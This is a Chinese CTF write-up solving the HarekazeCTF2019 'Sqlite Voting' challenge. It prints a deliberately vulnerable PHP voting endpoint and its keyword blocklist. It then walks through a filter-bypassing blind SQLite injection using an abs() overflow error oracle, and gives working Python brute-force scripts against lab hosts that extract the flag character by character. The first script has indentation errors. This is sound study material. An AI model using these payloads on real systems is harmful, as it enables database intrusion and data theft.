---
title: '[HarekazeCTF2019]Sqlite Voting'
date: 2024-11-12 14:15:46
tags:
      - sql注入
      - sqlite3 盲注
categories: 刷题笔记
---

### [HarekazeCTF2019]Sqlite Voting

我们在页面看见了投票的源码和数据库

![image-20241112144805599](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411121448740.png)

我们在schema.sql里发现了flag表

```sql
DROP TABLE IF EXISTS `vote`;
CREATE TABLE `vote` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `name` TEXT NOT NULL,
  `count` INTEGER
);
INSERT INTO `vote` (`name`, `count`) VALUES
  ('dog', 0),
  ('cat', 0),
  ('zebra', 0),
  ('koala', 0);

DROP TABLE IF EXISTS `flag`;
CREATE TABLE `flag` (
  `flag` TEXT NOT NULL
);
INSERT INTO `flag` VALUES ('HarekazeCTF{<redacted>}');
```

在vote.php里给出了查询sql的语句

```php
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // dangerous chars
    // " % ' * + / < = > \ _ ` ~ -
    "[\"%'*+\\/<=>\\\\_`~-]",
    // whitespace chars
    '\s',
    // dangerous functions
    'blob', 'load_extension', 'char', 'unicode',
    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
    'in', 'limit', 'order', 'union', 'join'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

header("Content-Type: text/json; charset=utf-8");

// check user input
if (!isset($_POST['id']) || empty($_POST['id'])) {
  die(json_encode(['error' => 'You must specify vote id']));
}
$id = $_POST['id'];
if (!is_valid($id)) {
  die(json_encode(['error' => 'Vote id contains dangerous chars']));
}

// update database
$pdo = new PDO('sqlite:../db/vote.db');
$res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
if ($res === false) {
  die(json_encode(['error' => 'An error occurred while updating database']));
}

// succeeded!
echo json_encode([
  'message' => 'Thank you for your vote! The result will be published after the CTF finished.'
]);
```

从源码来看，我们要post传一个id，但传递的id过滤了许多sql注入关键字，并且过滤了char和"和‘，所以我们无法使用 ASCII 码和字符进行判断

我们注意到源码给出了sql注入的语句，同时update的成功与失败分别对应不同的页面，因此我们可以考虑sql盲注

```php
$pdo = new PDO('sqlite:../db/vote.db');
$res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
if ($res === false) {
  die(json_encode(['error' => 'An error occurred while updating database']));
}

// succeeded!
echo json_encode([
  'message' => 'Thank you for your vote! The result will be published after the CTF finished.'
]);
```

由于源码进行了过滤，我们考虑用hex进行字符判断，将所有的字符串组合用有限的36个字符表示

先考虑对 flag 16 进制长度的判断，假设它的长度为 `x`，`y` 表示 2 的 n 次方，那么 `x&y` 就能表现出 `x` 二进制为 1 的位置，将这些 `y` 再进行或运算就可以得到完整的 `x` 的二进制，也就得到了 flag 的长度，而 `1<<n` 恰可以表示 2 的 n 次方

那如何构造报错语句，在sqlite3中abs函数有一个整数溢出的报错，如果abs的参数是`-9223372036854775808` 就会报错，同样如果是正数也会报错

![image-20241112150939325](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411121509362.png)

判断长度的 payload : `abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)`



脚本

```python
import requests

url = "http://fd9989d6-f121-47bc-835b-ac5537d1d693.node5.buuoj.cn:81/vote.php"
l = 0
  for n in range(16):
    payload = f'abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)'
    data = {
        'id' : payload
    }

    r = requests.post(url=url, data=data)
    print(r.text)
    if 'occurred' in r.text:
        l = l|1<<n

 print(l)
```

![image-20241112152113194](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411121521227.png)

爆出来flag长度为84

然后考虑逐字符进行判断，但是is_vaild()过滤了大部分截取字符的函数，而且也无法用ascii码进行判断

这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 `ABCDEF` ，这样十六进制的所有字符都可以使用了，并且使用 `trim(0,0)` 来表示空字符

```python
# hex(b'zebra') = 7A65627261
# 除去 12567 就是 A ，其余同理
A = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'

C = 'trim(hex(typeof(.1)),12567)'

D = 'trim(hex(0xffffffffffffffff),123)'

E = 'trim(hex(0.1),1230)'

F = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'

# hex(b'koala') = 6B6F616C61
# 除去 16CF 就是 B
B = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{C}||{F})'
```

然后逐字符进行爆破，已经知道 flag 格式为 `flag{}` ，`hex(b'flag{')==666C61677B` ，在其后面逐位添加十六进制字符，构成 paylaod

再利用 `replace(length(replace(flag,payload,''))),84,'')` 这个语句进行判断

如果 flag 不包含 payload ，那么得到的 `length` 必为 84 ，最外面的 `replace` 将返回 `false` ，通过 `case when then else` 构造 `abs` 参数为 `0` ，它不报错

如果 flag 包含 payload ，那么 `replace(flag, payload, '')` 将 flag 中的 payload 替换为空，得到的 `length` 必不为 84 ，最外面的 `replace` 将返回 `true` ，通过 `case when then else` 构造 `abs` 参数为 `0x8000000000000000` 令其报错

以上就可以根据报错爆破出 flag，最后附上出题人脚本

```python
# coding: utf-8
import binascii
import time

import requests
URL = 'http://1f876c16-71c9-4df0-b63c-99f9e7d43b88.node5.buuoj.cn:81/vote.php'
l = 84

header={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'}

table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'


res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
        //基本原理是用replace将已知的flag部分替换为空，通过长度变化与否一位一位爆出来
    },headers=header)
    if 'An error occurred' in r.text:
      res += x
      break
    time.sleep(0.06)
  # print(f'[+] flag ({i}/{l}): {res}')
  print('flag(hex): ',res)
  i += 1
# print('[+] flag:', binascii.unhexlify(res).decode())
print(binascii.unhexlify(res).decode())
```



**sqlite3 盲注 bypass ，利用 replace() 和 length 进行爆破，trim() 替换空字符，trim() 和 hex() 构造字符，& 特性获取长度等等，在 mysql 中也存在溢出的现象**

参考

https://blog.csdn.net/SopRomeo/article/details/108954685

https://xz.aliyun.com/t/6628?time__1311=n4%2BxnD0Dg7%3DWqrxBqooGkDuiRfQ4D5DkiCUjeD#toc-4
